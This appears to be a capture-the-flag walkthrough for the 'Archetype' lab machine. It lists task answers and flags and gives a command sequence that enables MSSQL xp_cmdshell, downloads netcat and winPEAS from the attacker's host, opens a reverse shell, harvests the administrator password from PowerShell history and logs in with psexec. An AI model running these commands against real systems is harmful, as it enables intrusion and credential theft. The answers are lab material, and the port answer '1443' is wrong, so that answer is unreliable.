# Archetype

> Task 1 - Which TCP port is hosting a database server? 

```
1443
```

> Task 2 -  What is the name of the non-Administrative share available over SMB? 

```
backups
```

> Task 3 -  What is the password identified in the file on the SMB share? 

```
M3g4c0rp123
```

> Task 4 -  What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? 

```
mssqlclient.py
```

> Task 5 - What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? 

```
xp_cmdshell
```

> Task 6 - What script can be used in order to search possible paths to escalate privileges on Windows hosts? 

```
winPEAS
```

> Task 7 -  What file contains the administrator's password? 

```
ConsoleHost_history.txt
```

> Submit user flag

```
3e7b102e78218e935bf3f4951fec21a3
```

> Submit root flag

```
python3 mssqlclient.py ARCHETYPE/sql_svc@$IP -windows-auth
sql
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  sp_configure;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  EXEC xp_cmdshell 'net user';
  xp_cmdshell "whoami"
python webserver & reverse shell
  python3 -m http.server
  nc -nvlp 9999
  SQL
    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://$MY_IP:8000/nc64.exe -outfile nc64.exe"
    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://$MY_IP:8000/winPEASx64.exe -outfile winPEASx64.exe"
    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe $MY_IP 9999"
in reverse shell
  cd Dekstop
  more user.txt
  .\winPEASx64.exe
  more C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    Administrator:MEGACORP_4dm1n!!
python3 psexec.py administrator@$IP
  under Desktop\root.txt
```

```
b91ccec3305e98240082d4474b848528
```

